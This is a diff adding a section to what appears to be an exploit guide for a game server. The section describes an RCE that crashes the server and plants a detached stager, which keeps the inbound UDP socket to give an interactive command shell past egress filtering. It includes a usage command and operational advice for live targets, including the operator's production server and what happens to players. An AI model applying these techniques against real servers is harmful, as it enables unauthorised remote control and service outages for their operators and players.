@@ -183,6 +183,34 @@ Three details, each of which is load-bearing:
 * **Quote it as `-c "... '...' &"`** — double quotes outside, single quotes inside — so your own shell
   passes the whole thing through as one argument.
 
+### Interactive shell against an egress-sealed target (`tools/rce-shell.py`)
+
+A reverse shell needs the target to open a **new outbound** connection, which a DMZ that egress-filters will
+drop (the operator's server, for instance, permits only DNS to its internal resolver). When that's the case, ride the
+**inbound game flow** instead — the one channel that's open by definition, since players connect on it.
+
+```sh
+./tools/rce-shell.py -P '<server password>' <host>
+# [+] shell is live as: uid=999(...)
+# prod$ id
+# prod$ hostname
+```
+
+`tools/stager.py` is delivered by the exploit's `system()` and run **detached**, so it outlives the server
+(which crashes seconds later from the hijacked `strlen`). It inherits the server's UDP `:25565` socket
+(`fd 4`, not `CLOEXEC`), keeps it bound after the crash, and answers a small command protocol back to the
+client **over that same socket** — replies match the established inbound 4-tuple, so stateful `pf` lets them
+out where a fresh `connect()` is dropped. No RIP control is involved; `system()` delivers the stager. It's
+the classic socket-reuse / findsock idea (skape; Metasploit `reuse`/`find_tag`) adapted to a shared UDP
+socket, so it's a command channel rather than a raw `/bin/sh` pipe — `id`, `cat`, `ls`, etc., not a full PTY.
+
+Notes for a live target:
+- **python3** must be present (standard on Ubuntu 24.04 cloud images).
+- If the server is under `systemd` with `Restart=`, the restart will fail to rebind `:25565` (the stager
+  holds it) and crash-loop, leaving the stager in control — usually fine, occasionally flaky. Stop the unit
+  over SSH *after* the exploit fires if you want a clean channel.
+- The game server is down for players while you hold the socket; restart it when you're done.
+
 If bash is not on the target, a portable alternative:
 
 ```sh
